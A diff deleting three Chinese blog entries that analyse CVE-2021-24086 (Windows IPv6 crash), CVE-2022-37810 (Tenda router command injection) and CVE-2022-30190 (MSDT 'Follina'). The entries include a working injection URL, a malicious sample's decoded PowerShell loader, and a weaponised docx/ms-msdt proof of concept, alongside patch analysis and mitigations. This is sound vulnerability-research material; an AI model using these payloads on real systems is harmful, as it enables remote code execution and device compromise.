@@ -403,914 +403,6 @@ int main(){
       </tags>
   </entry>
   <entry>
-    <title>CVE-2021-24086 TCPIP拒绝服务漏洞分析</title>
-    <url>/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="0x01漏洞描述"><a href="#0x01漏洞描述" class="headerlink" title="0x01漏洞描述"></a>0x01漏洞描述</h2><p>Windows IPv6协议栈存在的一处拒绝服务漏洞，漏洞的根本原因是IPv6的嵌套分片机制中，当尝试递归重组嵌套的分片时会计算内部有效载荷中包含的所有扩展标头，当重组扩展头约为0xffff字节的数据包时，tcpip!IPv6ReassembleDatagram中发生的NULL指针解引用发生崩溃。</p>
-<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>漏洞是在tcpip!Ipv6pReassembleDatagram函数中，向rax中写入数据时导致崩溃。</p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108162657004.png"></p>
-<h3 id="tcpip-Ipv6pReassembleDatagram"><a href="#tcpip-Ipv6pReassembleDatagram" class="headerlink" title="tcpip!Ipv6pReassembleDatagram"></a>tcpip!Ipv6pReassembleDatagram</h3><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108144319506.png"></p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108150549114.png"></p>
-<h3 id="NdisGetDataBuffer"><a href="#NdisGetDataBuffer" class="headerlink" title="NdisGetDataBuffer"></a>NdisGetDataBuffer</h3><pre class="line-numbers language-none"><code class="language-none">NDIS_EXPORTED_ROUTINE PVOID NdisGetDataBuffer(
-  [in]           NET_BUFFER *NetBuffer,    //指向NET_BUFFER的指针
-  [in]           ULONG      BytesNeeded,   //请求的数据的连续的字节数
-  [in, optional] PVOID      Storage,       //指向缓冲区的指针;如果调用方未提供任何缓冲区，则为 NULL 。 缓冲区的大小必须大于或等于 BytesNeeded 中指定的字节数。 如果此值不是 NULL，并且请求的数据不是连续的，则 NDIS 会将请求的数据复制到 存储 指示的区域。  
-  [in]           ULONG      AlignMultiple, //幂对齐
-  [in]           ULONG      AlignOffset    //对齐倍数的偏移量
-);
-
-NdisGetDataBuffer 返回指向连续数据的开头的指针，或者返回 NULL。
-如果 NetBuffer 参数指向的 NET_BUFFER 结构中NET_BUFFER_DATA结构的 DataLength 成员小于 BytesNeeded 参数中的值，则返回值为 NULL。
-如果缓冲区中请求的数据是连续的，则返回值是指向 NDIS 提供的位置的指针。 如果数据不连续，NDIS 使用 存储 参数，如下所示：
-如果 Storage 参数为非 NULL，则 NDIS 会将数据复制到 存储中的缓冲区。 返回值是传递给 Storage 参数的指针。
-如果 Storage 参数为 NULL，则返回值为 NULL。
-由于无法映射数据缓冲区的低资源条件，返回值也可能为 NULL 。 即使数据连续或存储参数为非 NULL，也可能发生这种情况。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>NdisGetDataBuffer函数返回数据指针或者NULL，rax是NdisGetDataBuffer函数的返回值，当赋值为0，之后赋值数据没有判断是否是空指针，就会导致异常。</p>
-<h3 id="ndis-NdisGetDataBuffer"><a href="#ndis-NdisGetDataBuffer" class="headerlink" title="ndis!NdisGetDataBuffer"></a>ndis!NdisGetDataBuffer</h3><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108152123775.png"></p>
-<p>NetBuffer-&gt;DataLength小于传进来的第二个参数BytesNeeded就会返回0。</p>
-<h3 id="tcpip-NetioRetreatNetBuffer"><a href="#tcpip-NetioRetreatNetBuffer" class="headerlink" title="tcpip!NetioRetreatNetBuffer"></a>tcpip!NetioRetreatNetBuffer</h3><p>在调用ndis!NdisGetDataBuffer之前调用了tcpip!NetioRetreatNetBuffer函数</p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109102806617.png"></p>
-<p>函数调用之前，NET_BUFFER-&gt;CurrentMdlOffset还没有设置，会调用NdisRetreatNetBufferDataStart函数设置NET_BUFFER结构。</p>
-<p>NdisRetreatNetBufferDataStart会把NET_BUFFER-&gt;DataLength设置为0x10,函数返回0</p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109105241377.png"></p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109105650123.png"></p>
-<p>a2 BytesNeeded是v3+0x28，v3是a2偏移0x68，a2是Ipv6pReceiveFragment函数中由IppCreateInReassemblySet生成，满足条件后才会调用tcpip!Ipv6pReassembleDatagram进行重组。</p>
-<h3 id="Ipv6pReceiveFragment"><a href="#Ipv6pReceiveFragment" class="headerlink" title="Ipv6pReceiveFragment"></a>Ipv6pReceiveFragment</h3><p>Ipv6pReceiveFragment函数作用是处理分片，当最后一个分片校验通过，就会调用tcpip!Ipv6pReassembleDatagram函数进行重组。</p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109110612827.png"></p>
-<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>攻击机：kali2022<br>靶机：win10专业版1709（16299.125）</p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221107164353456.png"></p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221107164441542.png"></p>
-<p>NdisGetDataBuffer有返回NULL的情况，可以使NET_BUFFER为NULL，NdisGetDataBuffer会返回NULL，就会触发BSOD空指针引用。</p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109113544500.png"></p>
-<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>Ipv6pReassembleDatagram增加了判断，当重组数据包options_data_length和fragment_sum_length和大于0xFFFF会调用IppDeleteFromReassmblySet函数删除这个包的信息，跳过重组。</p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109140212506.png"></p>
-<p>在NetioRetreaNetBuffer函数调用处将第二个参数长度变成32位，避免后续调用NdisGetDataBuffer参数不一致。</p>
-<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109140232843.png"></p>
-]]></content>
-      <categories>
-        <category>CVE</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2022-37810 Tenda路由器命令注入分析</title>
-    <url>/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Tenda AC1206(v15.03.06.23)存在formWriteFacMac命令注入漏洞，可以通过mac参数执行任意命令。</p>
-<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>US_AC1206V1.0RTL_V15.03.06.23_multi_TD01</p>
-<h4 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h4><p>提取固件运行httpd可执行文件</p>
-<pre class="line-numbers language-none"><code class="language-none">binwalk -Me US_AC1206V1.0RTL_V15.03.06.23_multi_TD01.bin <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h4 id="qemu执行"><a href="#qemu执行" class="headerlink" title="qemu执行"></a>qemu执行</h4><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121103057802.png"></p>
-<p>mips小端</p>
-<pre class="line-numbers language-none"><code class="language-none">cd _US_AC1206V1.0RTL_V15.03.06.23_multi_TD01.bin.extracted/squashfs-root/
-cp $(which qemu-mipsel-static) ./
-sudo ./qemu-mipsel-static -L ./ ./bin/httpd
-sudo chroot ./ ./qemu-mipsel-static ./bin/httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121103628491.png"></p>
-<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121104528268.png"></p>
-<p>main函数中0x00433a68有对apmib_init的判断，patch掉，bnez改为beqz</p>
-<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121111549227.png"></p>
-<p>ConnectCfm也需要改掉</p>
-<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121112030522.png"></p>
-<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121161405750.png"></p>
-<h4 id="添加网卡"><a href="#添加网卡" class="headerlink" title="添加网卡"></a>添加网卡</h4><pre class="line-numbers language-none"><code class="language-none">sudo brctl addbr br0 
-sudo brctl addif br0 eth0
-sudo ifconfig br0 up
-sudo dhclient br0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121161943583.png"></p>
-<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121162340458.png"></p>
-<h4 id="formWriteFacMac"><a href="#formWriteFacMac" class="headerlink" title="formWriteFacMac"></a>formWriteFacMac</h4><p>漏洞点在http的formWriteFacMac函数，IDA定位关键函数fromWirteFacMac，控制了mac参数就能利用doSystemCmd实现命令注入。</p>
-<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121162811780.png"></p>
-<h4 id="doSystemCmd"><a href="#doSystemCmd" class="headerlink" title="doSystemCmd"></a>doSystemCmd</h4><p>doSystemCmd函数不在httpd中，在libcommon.so中</p>
-<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121164709994.png"></p>
-<p>交叉引用查看formWriteFacMac函数调用链</p>
-<pre class="line-numbers language-none"><code class="language-none">main -&gt; initWebs -&gt; formDefineTenDa -&gt; websFormDefine('WriteFacMac',formWriteFacMac);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>formDefineTenDa包含路由器接口和对应的处理函数，通过websFormDefine注册后，WriteFacMac会和formWriteFacMac形成绑定，在goform下产生接口WriteFacMac调用formWriteFacMac</p>
-<p>192.168.130.137/goform/WriteFacMac</p>
-<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121174942212.png"></p>
-<h4 id="initWebs"><a href="#initWebs" class="headerlink" title="initWebs"></a>initWebs</h4><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121170833769.png"></p>
-<h4 id="formDefineTenDa"><a href="#formDefineTenDa" class="headerlink" title="formDefineTenDa"></a>formDefineTenDa</h4><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121165748345.png"></p>
-<h4 id="websGetVar"><a href="#websGetVar" class="headerlink" title="websGetVar"></a>websGetVar</h4><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121172710514.png"></p>
-<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121172721758.png"></p>
-<p>判断wp中的mac参数是否存在，不存在返回默认值00:01:02:11:22:33，存在则返回对应值，没有做任何过滤，因此可以直接构造。</p>
-<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>当wp判断mac参数是否存在时，返回值没有做任何过滤，因此可以直接构造。</p>
-<pre class="line-numbers language-none"><code class="language-none">192.168.130.137/goform/WriteFacMac?mac=00:01:02:11:22:33 || ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121175540394.png"></p>
-]]></content>
-      <categories>
-        <category>CVE</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2022-30190 MSDT远程代码注入漏洞分析</title>
-    <url>/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h4 id="WTP框架"><a href="#WTP框架" class="headerlink" title="WTP框架"></a>WTP框架</h4><p>windows疑难解答平台（WTP）为ISV、OEM和管理员提供了疑难解答包的过程，这些包用于发现和解决计算机上的问题。WTP框架提供自动化检测修复方式。</p>
-<h4 id="底层结构"><a href="#底层结构" class="headerlink" title="底层结构"></a>底层结构</h4><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220816150216855.png" alt="image-20220816150216855" style="zoom: 67%;">
-
-<ul>
-<li>WTP由两个进程组成，Process1是带UI的Troubleshooting Run-time Engine，Process2用于提供window PowerShell Runtime环境。</li>
-<li>Process2提供的PowerShell运行时环境提供了4条特殊的PowerShell命令：Get-DiagInput、Update-DiagReport、Update-DiagRootCause、Write-DiagProgress</li>
-<li>Troubleshooting Pack运行在Process1和Process2所构建的平台上。</li>
-</ul>
-<h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><ul>
-<li><p>故障排除包是用户可编程部分，本质上是一组针对特定故障的检测修复脚本。Process1(Troubleshooting Run-time Engine)通过故障排除包获取检测脚本检测问题，查出问题交给Process2(PowerShell)运行处理。</p>
-</li>
-<li><p>Process1是msdt.exe，Process2是sdiagnhost.exe</p>
-</li>
-<li><p>sdiagnhost.exe为了给msdt.exe提供运行脚本的能力，注册了IScriptedDiagnosticHost com接口，相应的com方法是RunScript()</p>
-</li>
-<li><p>故障排除包的设计基于三个步骤：检测问题（troubleshooting）、解决问题（resolution）和验证解决方案（verificationg），对应TS、RS、VF三种脚本。</p>
-</li>
-</ul>
-<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>WTP提供了一系列默认故障排除包，可以在ms-msdt协议里通过-id参数指定。</p>
-<p>CVE-2022-30190使用PCWDiagnostic，用于程序兼容性故障排除。</p>
-<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>Microsoft Office MSDT存在远程代码执行漏洞，攻击者可以利用Office文件中的远程模块功能，访问远程服务器上挂载的恶意HTML文件，之后通过ms-msdt URL来执行恶意powershell代码，漏洞在宏被禁用的情况下依然可以利用。</p>
-<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>CVE-2022-30190本质上是PowerShell代码注入漏洞。MSDT和Powershell的C:\Windows\diagnostics\system\PCW\TS_ProgramCompatibilityWizard.ps1脚本交互，相关的IT_BrowseForFile参数存在命令注入，最终的调用PowerShell动态执行。</p>
-<p><strong>影响版本：</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">Microsoft Windows Server 2008 SP2
-Microsoft Windows 11
-Microsoft Windows Server 2019
-Microsoft Windows 10 1607
-Microsoft Windows Server 20H2
-Microsoft Windows Server 2022
-Microsoft Windows Server 2016 (Server Core installation)
-Microsoft Windows Server 2016 null
-Microsoft Windows 10
-Microsoft Windows 10 1809
-Microsoft Windows Server 2008 R2 SP1
-Microsoft Windows Server 2022 (Server Core installation)
-Microsoft Windows Server 2019 (Server Core installation)
-Microsoft Windows 8.1
-Microsoft Windows 10 20H2
-Microsoft Windows 10 21H2
-Microsoft Windows Server 2012 R2
-Microsoft Windows 7 SP1
-Microsoft Windows RT 8.1 SP0
-Microsoft Windows Server 2012
-Microsoft Windows 10 21H1
-Microsoft Windows Server 2022 Azure Edition Core Hotpatch <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h4><p>样本是docx文件，解压，其中/word/_rels目录下的document.xml.rels文件包含对<a href="https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html%E7%9A%84%E5%A4%96%E9%83%A8%E5%BC%95%E7%94%A8%E3%80%82">https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html的外部引用。</a></p>
-<p><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220816163900629.png"></p>
-<p><strong>RDF842l.html原始内容：</strong></p>
-<p>使用了4个参数，IT_RebrowseForFile、IT_LaunchMethod、IT_SelectProgram、IT_BrowseForFile。利用IT_BrowseForFile参数加载了powershell脚本执行恶意功能。4096字节的A填充，是windows诊断工具的缓冲区大小。</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;!doctype html&gt;
-&lt;html lang="en"&gt;
-&lt;body&gt;
-&lt;script&gt;
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-&lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>首先使用window.location.href创建窗口，ms-msdt是windows诊断工具，之后调用powershell，执行的内容经过了base64加密</p>
-<p><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220817165023922.png"></p>
-<p>解密得到</p>
-<pre class="line-numbers language-none"><code class="language-none">$cmd = "c:\windows\system32\cmd.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c taskkill /f /im msdt.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c cd C:\users\public\&amp;&amp;for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&amp;&amp;findstr TVNDRgAAAA 1.rar&gt;1.t&amp;&amp;certutil -decode 1.t 1.c &amp;&amp;expand 1.c -F:* .&amp;&amp;rgb.exe";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>启动隐藏窗口：</p>
-<pre class="line-numbers language-none"><code class="language-none">如果msdt.exe正在运行，终止它
-循环遍历RAR文件中的文件，查找编码CAB文件的Base64字符串
-将Base64字符串编码的cab文件保存1.c
-将1.c cab文件展开到当前目录
-最后执行rgb.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>因此window会无限制执行powershell.如果修改成想要执行的代码，就会导致远程代码执行漏洞。因此，只需修改xml文件，引用网站上的恶意代码就行。</p>
-<h4 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h4><p>在Microsoft.Windows.Diagnosis.SDHost.dll里的Microsoft.Windows.Diagnosis.ManagedHost.Run Script()方法实现了IScriptedDiagnosticHost com接口里的RunScript方法，用于给msdt.exe提供执行检测脚本所需要的PowerShell运行时环境，然后重新触发漏洞。RunScript()方法一共被触发了两次，第一次用于调用TS脚本，第二次用于调用RS脚本。</p>
-<p>要触发对RS_ProgramCompatibityWizard.ps1的调用，要先通过TS_ProgramCompatibilityWizard.ps1脚本的检测</p>
-<h4 id="TS-ProgramCompatibilityWizard-ps1"><a href="#TS-ProgramCompatibilityWizard-ps1" class="headerlink" title="TS_ProgramCompatibilityWizard.ps1"></a>TS_ProgramCompatibilityWizard.ps1</h4><p>Get-DiagInput用于从用户获取输入的信息，获取传入的IT_BrowseForFile参数，并赋值给$selectedProgram变量。</p>
-<pre class="line-numbers language-none"><code class="language-none">if(-not($ChoicesAvailable))
-{
-    $selectedProgram = Get-DiagInput -id IT_BrowseForFile
-}
-else
-{
-    $selectedProgram = Get-DiagInput -id IT_SelectProgram -choice $choices
-
-	## If the user chose the option "Not listed" we will ask them to browse for a file
-    if($selectedProgram -eq "NotListed")
-    {
-        $selectedProgram = Get-DiagInput -id IT_BrowseForFile
-    }
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>调用Test-Selection方法对$selectedProgram进行检测。使用test_path命令来对路径进行检测，确保路径存在，对于/../返回到根路径之外的路径返回True，要求路径的扩展名为exe和msi。</p>
-<pre class="line-numbers language-none"><code class="language-none">function Test-Selection([string]$appPath)
-{
-    $testresult = $false
-
-    if(($appPath -ne $null) -and -not([String]::IsNullOrEmpty($appPath)))
-    {
-        $testresult = test-path -literalpath $appPath
-
-        if($testresult)
-        {
-            if(-not($type::IsFileProtected($appPath)))
-            {
-                $extension = [System.IO.Path]::GetExtension($appPath)
-                $testresult = ($extension -eq ".exe") -or ($extension -eq ".msi")
-            }
-            else
-            {
-                $testresult = $false
-                Set-Variable -name rebrowseText -value $CompatibilityStrings.Text_FILE_PROTECTED -scope global
-            }
-        }
-    }
-
-    Set-Variable -name appValid -value $testResult -scope global
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>从$selectedProgram提取文件名，过滤$符号，防止代码注入。由于脚本直接使用$,$实际会在过滤前被PowerShell引擎解析，所以无法起到过滤$字符的作用。</p>
-<p>正确写法应为 $appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace(“`$”, “``$”)</p>
-<pre class="line-numbers language-none"><code class="language-none">while(-not($appValid))
-{
-    $InstanceId++
-    $selection = $selectedProgram
-    $selectedProgram = Get-DiagInput -id IT_RebrowseForFile -parameter @{ "SelectedProgram" = $selection; "RebrowseText" = $rebrowseText; "Instance" = $InstanceId }
-    Set-Variable -name rebrowseText -value $CompatibilityStrings.Text_FILE_INVALID -scope global
-    Test-Selection($selectedProgram)
-}
-
-$appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace("$", "`$")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>TS最后使用Update-DiagRootCause命令，用于报告root cause的状态。会触发RS_脚本，parameter指定的字典会被作为参数传给脚本，导致第二次调用RunScript()方法，并且参数中-TargetPath可控，进而触发了漏洞。</p>
-<pre class="line-numbers language-none"><code class="language-none">if ($UpdateChoice -eq "ts_Manual")
-{
-    $Env:RecommendedLayer = $AppInfo[2]
-    Update-DiagRootCause -id "RC_IncompatibleApplication" -iid $appName -Detected $true -parameter @{ "TARGETPATH" = $selectedProgram; "APPNAME" = $appName}
-}
-else
-{
-    Start-Process -FilePath $AppInfo[1]
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>1.新建word文档，后缀更改为zip，打开后编辑/word/_regs目录下的document.xml.rels按照格式加入。</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;Relationship  Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObje ct" Target="mhtml:http://localhost:80/exploit.html!x-usc:http://localhost:80/exploit.html" TargetMode="External"/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>2.建一个文件夹作为web站点目录，新建exploit.html文件添加（弹计算器）</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;
-location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=?
-IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\\\localhost\\c$\\windows\\system32\\calc)/.exe\"";
-&lt;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>IT_RebrowseForFile参数开头至少需要两次/../目录遍历</p>
-<p>包含$()中的代码会通过PowerShell执行</p>
-<p>.exe必须是IT_BrowseForFile参数末尾的最后一个字符串</p>
-<h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><p><strong>缓解方法：</strong></p>
-<p>1.禁用MSDT URL协议阻止使用漏洞的恶意攻击。</p>
-<p>2.禁用MSDT URL协议可防止故障排除应用程序作为链接启动，包括整个操作系统的链接。</p>
-<p><strong>禁用方法：</strong></p>
-<p>1.以管理员身份运行命令提示符</p>
-<p>2.备份注册表项，执行命令<code>reg export HKEY_CLASSES_ROOT\ms-msdt [filename]</code></p>
-<p>3.执行命令<code>reg delete HKEY_CLASSES_ROOT\ms-msdt</code></p>
-<p><strong>撤销禁用：</strong></p>
-<p>1.以管理员身份运行命令提示符</p>
-<p>2.恢复注册表项，执行命令“reg import [filename]”</p>
